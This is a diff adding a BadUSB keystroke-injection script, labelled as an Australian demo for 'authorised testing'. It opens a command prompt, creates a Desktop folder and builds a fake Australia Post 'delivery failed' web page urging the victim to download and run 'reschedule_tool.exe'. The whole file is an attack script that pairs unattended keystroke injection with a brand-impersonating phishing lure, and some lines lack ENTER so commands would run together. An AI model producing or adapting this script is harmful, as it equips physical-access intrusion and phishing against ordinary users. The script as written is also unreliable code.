@@ -1,0 +1,46 @@
+REM ================================================
+REM Australian BadUSB Payload Example
+REM AusPost "Parcel Delivery Failed" Lure
+REM 
+REM FOR AUTHORISED TESTING / EDUCATIONAL USE ONLY
+REM Using this without explicit permission is illegal.
+REM ================================================
+
+REM Open Run dialog
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+
+REM Create a fake "urgent" folder on Desktop
+STRING mkdir %USERPROFILE%\Desktop\AusPost_Urgent_Parcel_2026
+ENTER
+DELAY 300
+
+REM Open the folder
+STRING start %USERPROFILE%\Desktop\AusPost_Urgent_Parcel_2026
+ENTER
+DELAY 600
+
+REM Create a convincing fake HTML page (opens in browser)
+STRING echo ^<html^>^<head^>^<title^>AusPost - Delivery Issue^</title^>^</head^>^<body style="font-family: Arial; text-align:center; padding:40px;"^> > index.html
+ENTER
+DELAY 200
+STRING echo ^<h1 style="color:#E60000;"^>AusPost Delivery Problem^</h1^> >> index.html
+ENTER
+STRING echo ^<p^>We were unable to deliver your parcel on 02/06/2026.^</p^> >> index.html
+STRING echo ^<p^>^<strong^>Action Required:^</strong^> Please download and run the reschedule tool below.^</p^> >> index.html
+STRING echo ^<a href="reschedule_tool.exe" style="background:#E60000;color:white;padding:15px 30px;text-decoration:none;border-radius:5px;"^>Download Reschedule Tool^</a^> >> index.html
+STRING echo ^</body^>^</html^> >> index.html
+ENTER
+DELAY 300
+
+REM Open the fake page
+STRING start index.html
+ENTER
+
+REM This is a DEMONSTRATION payload only.
+REM In a real authorised test you would pair this with an actual 
+REM benign executable or further social engineering.
+REM Do not use for malicious purposes.
